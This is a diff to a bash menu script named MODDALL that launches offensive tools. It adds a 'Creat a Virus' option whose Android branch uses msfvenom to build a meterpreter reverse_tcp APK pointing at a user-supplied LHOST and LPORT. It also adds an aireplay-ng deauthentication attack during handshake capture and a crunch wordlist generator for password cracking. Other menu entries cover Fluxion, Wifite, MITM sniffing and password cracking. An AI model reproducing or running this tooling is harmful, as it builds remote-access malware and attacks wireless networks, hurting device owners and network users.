@@ -1,6 +1,7 @@
  #!/bin/bash 
 chmod +x AIRODUMP.sh
 chmod +x CAPTUREHANDESHAKE.sh
+chmod +x IFCONFIG.sh
 clear
 echo "$(tput setaf 6) 
     __  ___  ____    ____    ____    ___      __      __
@@ -10,11 +11,12 @@ echo "$(tput setaf 6)
 /_/  /_/  \____/ /____/  /____/  /_/  |_/ /_____/ /_____/ 
 
 " 
+YL="\e[1;33m"
 RED='\033[31m'
 echo "$(tput setaf 2) Version 2.1"
 NC='\033[0m'
 echo "$(tput setaf 3) Select from menu:"
-echo''
+echo
 echo	"        $(tput setaf 1)1) Airodump"
 echo 	'	2) Fluxion  '
 echo	'	3) Wifite   '
@@ -25,6 +27,7 @@ echo    '        7) Deauthing Attacks '
 echo    '        8) Sniffing/MITM Attacks ' 
 echo    '        9) Data Sniffer '
 echo    '       10) Passwort cracking '
+echo    '       11) Creat a Virus '
 
 
 echo 
@@ -47,8 +50,10 @@ if test $EINGABE = "1"
    echo '3) Scan for ACPs'
    echo '4) Target scan an ACP'
    echo '5) Get Capture File '
+   echo '0) Back to main'
    echo
    read EINGABEZ
+   
    if test $EINGABEZ = "1"
      then
      clear
@@ -125,6 +130,38 @@ fi
       ./MODDALL.sh
 fi
 fi
+
+   if test $EINGABE = "11"   
+    then 
+    clear
+    echo "
+    __  ___  ____    ____    ____    ___      __      __
+   /  |/  / / __ \  / __ \  / __ \  /   |    / /     / / 
+  / /|_/ / / / / / / / / / / / / / / /| |   / /     / /  
+ / /  / / / /_/ / / /_/ / / /_/ / / ___ |  / /___  / /___
+/_/  /_/  \____/ /____/  /____/  /_/  |_/ /_____/ /_____/ 
+
+"
+    echo "Do you want to creat a Virus for:"
+    echo "1)Android"
+    echo "2)Windows"
+    echo "3)Mac Os"
+    read OS
+    if test $OS = "1"
+     then 
+     gnome-terminal --geometry 100x20+0+999999 -e ./IFCONFIG.sh
+     clear
+     echo Put in the LHOST!
+     read ALHOST
+     clear
+     echo Put in the LPORT!
+     echo Usally 4444
+     read ALPORT
+     msfvenom -p android/meterpreter/reverse_tcp LHOST=$ALHOST LPORT=$ALPORT R > Main.apk
+     ./MODDALL.sh
+fi
+fi
+
    if test $EINGABE = "2"   
     then 
     clear
@@ -232,7 +269,18 @@ fi
 
    if test $EINGABE = "6"
     then 
-    xterm&
+    echo From 
+    echo Example 1
+    read FFROM
+    clear 
+    echo To
+    echo Example 10
+    read TTOO
+    clear 
+    echo Letters and Numbers 
+    echo Example aBc3
+    read LLETTERS
+    crunch $FFROM $TTOO $LLETTERS -o wordlist.txt
     
 fi
 
@@ -432,12 +480,15 @@ fi
       echo Another window will open now to get the Cap file
       echo The Cap file will be safed into the MODDALL folder
       echo 
+      gnome-terminal --geometry 100x20+0+999999 -e ./AIRODUMP.sh
+      clear
       echo Now put in the BSSID 
       read BSSIDSSIDSS
       echo 
       echo Now put in the CHANNEL
       read CHANNELCHANNEL
-      xterm -e airodump-ng -c $CHANNELCHANNEL --bssid $BSSIDSSIDSS -w /root/Videos/MODDALL/ wlan0mon &
+      xterm -e airodump-ng -c $CHANNELCHANNEL --bssid $BSSIDSSIDSS -w /root/ wlan0mon &
+      xterm -e aireplay-ng --deauth 5 -a $BSSIDSSIDSS wlan0mon &
       clear
       echo Put in the Cap File Location
       read LOCATIONCFFFF
@@ -484,5 +535,6 @@ fi
     sleep 0.25
    ./MODDALL.sh
 fi
+
 fi
     
